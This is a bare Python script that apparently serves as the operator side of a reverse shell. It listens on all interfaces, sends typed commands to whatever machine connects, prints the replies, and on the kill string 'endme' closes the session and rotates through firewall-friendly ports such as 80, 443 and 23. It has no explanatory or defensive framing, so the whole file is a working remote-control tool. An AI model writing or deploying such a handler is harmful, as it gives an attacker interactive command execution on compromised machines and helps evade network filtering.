import socket
import time

HOST = "0.0.0.0"  # all local IPs
ports = [80, 8080, 443, 20, 21, 23]
PORT = ports[0]
BUFFER = 1024

KILLSTRING = "endme"


def nextPort(p):
	global ports
	i = ports.index(p)
	if i == 5:
		return ports[0]
	return ports[i+1]


open_conn = False
while True:
	try:
		if not open_conn:
			s = socket.socket()
			s.bind((HOST, PORT))
			print(f'Ready for connections on {PORT}')
			s.listen()
			conn, raddr = s.accept()
			open_conn = True

		cmd = input("$ ")
		conn.send(cmd.encode())
		
		if cmd == KILLSTRING:
			print("Ending")
			conn.shutdown(1)
			conn.close()
			open_conn = False
			s.close()
			PORT = nextPort(PORT)
		else:
			rsp = conn.recv(BUFFER).decode()
			print(rsp)
	except Exception as e:
		print(e)
		time.sleep(1)
